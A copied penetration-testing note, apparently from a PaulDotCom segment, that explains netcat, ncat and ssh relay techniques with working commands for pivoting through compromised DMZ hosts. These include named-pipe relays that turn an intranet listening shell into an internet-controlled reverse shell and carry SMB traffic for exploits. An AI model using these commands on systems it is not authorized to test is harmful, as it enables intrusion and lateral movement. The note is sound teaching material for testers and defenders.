@@ -1,0 +1,161 @@
+http://www.michaelboman.org/books/penetration-testing-notes/netcat
+
+Books & Reference Materials‎ > ‎Penetration Testing notes
+Netcat
+From PaulDotCom episode 195:
+
+Tech Segment: Crazy-Ass Netcat Relays for Fun and Profit
+Background
+
+Netcat relays are really useful in computer attacks, because they offer a great avenue for pivoting through one conquered machine to exploit and communicate with other systems. Penetration testers need to be aware of the various options for relaying, which go beyond the traditional listener-to-client relay. Likewise, incident handlers need to be aware of how bad guys can use these capabilities in their attacks. Netcat relays are often used to bounce through systems to get access to a remote shell on a target machine. But, if constructed properly, they can pump any kind of data… not just shell access.
+History
+
+Back in 1999 or 2000, I saw a presentation by the Foundstone guys (George Kurtz and his merry band) about relaying through machines on a DMZ by listening on one TCP port and forwarding data through to another system on another port. Their session showed how to implement this using their own FPipe tool for Windows. Back Orifice 2000 also included some interesting TCP relaying capabilities, similar to FPipe.
+
+They also talked about implementing a pivot by using inetd to listen, and, when it receives a connection, to launch Netcat to connect to another port on another box. This can be accomplished by editing the inetd.conf file, adding a line like this:
+
+80 stream tcp nowait nobody /usr/sbin/tcpd /usr/bin/nc next_hop 443
+
+When inetd receives a connection on TCP port 80, it would launch Netcat to make another connection to the next_hop (IPaddress) on TCP 443, forwarding all data across the connection.
+
+I never really liked this approach much, because it required altering inetd.conf, something a diligent sysadmin would surely notice via a file integrity checker, like Tripwire. But, this simple relay got me thinking.
+
+At around the same time, I was handling an incident, and an attacker hacked into one of my client’s boxes. On the box, he implemented a pure Netcat relay (no Fpipe, no Back Orifice, no inetd) as follows:
+
+nc -nvlp 80 | nc next_hop 443 | nc previous_hop 8080
+
+Here, the attacker is listening on TCP 80 on the relay machine. Whatever comes in is forwarded to the next_hop on port 443. The forward direction works great, pumping data through. But, the response data here kinda stinks. Any data that comes back from the next_hop is dumped into TCP 8080 sent back to the previous hop. The attacker has split the flow of data flowing forward and back through the relay. That’s cheesy. On the previous_hop, he’d have to have two terminals open. In one, he’d run a Netcat client to connect to the relay on port 80. On the other, he’d have a listener waiting for connections to come back on port 8080. Then, he’d type a command into the Netcat client sending a command, like “ls”. The output of the command would appear in the Netcat listener windows. That’s kind of an ugly split. Call me a diva, but I wanted the Standard Output of my commands to display in the same Window I’m typing my Standard Input into.
+A Traditional Client-to-Listener Netcat Relay
+
+Given the cheesiness of the triple-Netcat approach, I decided to come up with a better way of doing it, using a little shell redirect action through a named pipe in Linux:
+
+mknod backpipe p
+nc –nvlp 80 0<backpipe | nc next_hop 443 1>backpipe
+
+These relays work beautifully, and I consider them to be a Traditional Netcat relay, with a Netcat listener waiting for data, pumping whatever it gets into a Netcat client for the next hop. Our nice little FIFO backpipe handles the return traffic. I started to use this in my penetration tests for pivoting, and added it to some presentations I was giving at the time. It seemed to catch on, as I started to see bad guys using it in the incidents I was handling. It kinda weirded me out to see my stuff used against me, but these things happen.
+The Client-to-Client Gender-Bender Relay
+
+A few years later, I had a guy who took my SANS class, who was working on a pen test during the evenings after class. He had a scenario where he had a listening shell on a TCP port an internal box inside a company. He also had the ability to execute shell commands on a DMZ system, but he couldn’t listen on a port on this system because all inbound traffic was firewalled with iptables. He couldn’t reconfigure iptables, because he didn’t have root. He wanted to do a Netcat relay via the DMZ box to get access to his intranet shell, and asked me how I’d do it. Instantly, I thought of the following:
+
+On your box on the Internet, create a listener to wait for a reverse shell connection to come in:nc –nvlp 80
+
+Then, on the DMZ box, make a client-to-client relay:
+
+mknod backpipe p
+nc InternetPenTestBox 80 0<backpipe | nc IntranetShellBox 443 1>backpipe
+
+This little relay would turn a listening shell on the intranet into a reverse shell controlled from the Internet. He used it in the pen test that night, and told me it allowed him to dominate the target environment. Sweet!
+
+I call this a “Gender-Bender” relay, because it’s a client-to-client connection… kind of like in plumbing or electrical work, where you have gender-bender connectors.
+More Gender-Bender Relays
+
+Then, in my pen testing work, I needed to get other data through a Netcat relay, including ssh and SMB. The traditional client-to-listener relays aren’t limited to carrying shell commands and responses; they can carry any kind of traffic. But, I was facing scenarios with a DMZ box where I wanted to build the relay, but couldn’t listen on TCP port 22 or 445 due either to iptables restrictions or the fact that I didn’t have UID 0 so I couldn’t listen on TCP ports less than 1024. I wanted to use the client-to-client relay idea, but my SMB client software (net use, psexec, fgdump, etc.) initiated connections, as did my ssh clients. I hit upon the idea of using two relays: a client-to-client relay on the DMZ, plus a listener-to-listener relay on my own box. These two gender-bender relays back to back could be used very flexibly. Here are the commands for shuttling SMB through a DMZ box to an internal system:
+
+On my own external Internet Pen Test Linux box, I create a listener-to-listener relay:
+mknod backpipe p
+nc –nvlp 80 0<backpipe | nc –nvlp 445 1>backpipe
+
+On the DMZ box:
+mknod backpipe p nc InternetPenTestBox 80 0<backpipe | nc IntranetShellBox 445 1>backpipe
+
+Then, from some external Windows box on the Internet, I could run net use, psexec, or fgdump and connect to my external Linux box, which would relay the connection to the DMZ client-to-client relay, which would carry the data to the intranet box. This worked beautifully, and didn’t require UID 0 or a firewall reconfig of the DMZ box. It’s two outbound connections from a DMZ (one to the Internet, the other to the intranet) implementing one inbound connection from the Internet to the intranet, and SMB, no less! You haven’t lived until you’ve mounted a share across something like this, or better yet, shot your favorite Metasploit exploit for SMB through it.
+Enter Ncat
+
+Around this time, the ncat tool was released by the Nmap project. It is an awesome and very powerful reimagining of Netcat, including SSL and many other wonderful features. One of my favorite features is “broker” mode, invoked via the --broker option, which can only be used in --listen mode. This mode, in effect, creates a listener-to-listener relay automatically, as follows:
+
+ncat --listen --broker 80
+
+From a positive perspective, ncat allows for arbitrary numbers of clients to connect to this brokering listener, which is very cool. Whenever anyone sends data, it is blasted out to all of the other clients that are connected. Up to 100 clients can connect by default, although the “–m num” option allows to specify another upper bound on the number of clients that connect. The listener-to-listener relays I build only allow two connections.
+
+From a downside perspective, it should be noted that ncat used in broker mode only allows connections on one listening port at a time (80 in the example above). My listener-to-listener relays allows for interconnecting a listener on one port (say, 445) to another port (say, 80). Of course, you can build the gender-bender relays that I show above using Netcat or ncat.
+
+Besides allowing for arbitrary numbers of connections and having built-in broker capabilities, ncat also features a --chat option, which works like --broker, but it prepends a user number in front of all data typed by a given client.
+Instrumented Relays
+
+When I was writing my SANS 560 class, I wanted to put the very useful gender-bender relays to use in carrying SMB across 445, but I wanted people to be able to “see” the data as it flowed through the connection, to make it seem more real and approachable. I hit upon the idea of an instrumented Netcat relay, which I implemented as follows:
+
+mknod backpipe p
+nc –nvlp 445 0<backpipe | nc next_hop 445 | tee backpipe
+
+With the tee command, all data flowing back through the relay would now be displayed on the screen. So, you could watch the data as it flows through, seeing the SMB. What’s more, if you have a terminal on a machine with sound, you can actually hear the data too. Whenever there is a 0x07 that flows the relay, the ASCII BEL symbol will trigger the system bell on your box. SMB sounds very different from HTTP. It’s much more guttural. SSH also sounds kinda pretty flowing through.
+
+Note that you could use the simple “| tee backpipe” syntax here for any of the relays described above (except the ncat --broker): the listener-to-client, the client-to-client, and the listener-to-listener.
+Relay Interruptus: Splitting the Relay into Two Independent Parts
+
+Sometimes, you will want to use a relay to make a connection, but then you’ll want to drop off one side of the relay while keeping the other side connected. Suppose we have a listener-to-client relay, and we plan to drop the listener after the client makes the connection. We can do that in two separate windows, with:
+
+tail –F –n 0 FwdFile | nc next_hop 80 | tee RevFile
+
+That’s the client portion. We then make the listener portion in another window with:
+
+tail –F –n 0 RevFile | nc –nvlp 80 | tee FwdFile
+
+Then, we can do stuff through the relay… whatever we want. We can then drop either the front client half or the listener half, while keeping the other half up. We can then connect either side to another client or listener by running the appropriate command again, perhaps with a different end point. We can alter the flow of plumbing while keeping the other side connected!
+
+I sometimes use this construct to make a connection through the relay, which engages in a complex handshake. Then, I drop the listener-side of the relay by hitting CTRL-C. I can then make another listener in the same way, and dump another connection through the relay.
+Side-Channels with Relay Injection
+
+With the split relays I show above, you can inject data right into the connection by simply echoing data into FwdFile or RevFile on the relay machine:
+
+echo whatever > FwdFile
+
+This essentially acts as a side channel for someone to dump data into the relay and send it either to the forward hop via FwdFile or the previous hop via RevFile.
+The Merging Relay
+
+Using the constructs we have above, we can build a merging relay, with two listeners connecting into 1 client. We start by making two listeners, dumping their stuff into FwdFile:
+
+mknod FwdFile p nc –nvlp 2222 1>FwdFile
+
+In another window:
+
+nc –nvlp 1111 1>FwdFile
+
+In a third window, we make a client, that takes data from FwdFile and sends it to the next_hop:
+
+nc –nv next_hop 3333 0<FwdFile
+
+This method is easily expandable to N listeners merging their data into 1 client.
+The Splitting Relay
+
+For our next trick, we’ll reverse the previous one, doing a split: we’ll have 1 listener dumping data into 2 clients.
+
+We start with a listener:
+nc –nvlp 80 | tee FwdFile
+
+Then, in another window:
+tail –F –n 0 FwdFile | nc next_hop 80
+
+And, in a third window:
+tail –F –n 0 FwdFile | nc another_hop 80
+
+Now, there is some oddness with this one. Turns out every other line is sent to every other hop. It’s because of contention of having multiple reads from the FwdFile. Still, it’s kinda fun to watch line 1 go to client1, and line 2 go to client 2, and so on.
+Finally, a Word About OpenSSH Netcat Mode
+
+In early April, the OpenSSH project released version 5.4, which includes a new “netcat mode”. This is pretty cool, and features a built-in listener-to-client relay capability. The idea here is that you can take Standard In on one machine with an ssh client, connect with an encrypted ssh session to another machine running sshd, which will then forward your Standard In via a TCP connection (un-ssh encrypted) to yet another box.
+
+For example, consider 3 boxes: Box1, Box2, and Box3.
+
+Suppose Box1 has an ssh client, Box2 and sshd, and Box3 has, well, anything… maybe a listener on port 2222.
+
+On Box1, we could run:
+
+ssh –W Box3:2222 user@Box2
+
+Then, whatever we send on Standard In at the terminal on Box1 will be carried via ssh to Box2, where it will then be forwarded (in clear text) to Box3 on port 2222.
+
+Pretty slick.
+
+Of course, we still have the local port forwards we’ve had for years via the –L option:
+
+ssh –L 445:Box3:445 user@Box2
+
+This will listen on local port 445 and forward data received there across an ssh connection to Box2, which will then forward that data to Box3 on port 445 in cleartext. So, what’s the difference between the old –L and the new –W?
+
+The new netcat mode (with –W) just takes Standard In of ssh and throws it across the network, just like Netcat, as opposed to listening on a port on the localhost, like the –L option does. Instead of port forwarding, it’s Standard In forwarding. It’s more flexible that way, as we don’t have to listen a local port, but can instead just throw Standard In across the network. For example, we can just cat a file into ssh and shoot it through an sshd to get it to a waiting listening server.
+Conclusions
+
+I’d like to encourage people to play with these relays! There is so much very cool stuff you can make with them.
+
+Another fun tool to play with is Ron Bowes’ dnscat, which is Netcat-style functionality, across DNS queries and responses, which will be forwarded through a DNS server. It’s awesome, and you can learn more about it here: http://www.skullsecurity.org/wiki/index.php/Dnscat
+
+And, finally, the Nmap team is doing a survey of their users to determine how they use Nmap and what features they should add. Everyone who relies on Nmap and its related tools (such at ncat) should fill it out. Details are at: http://nmap.org/survey/
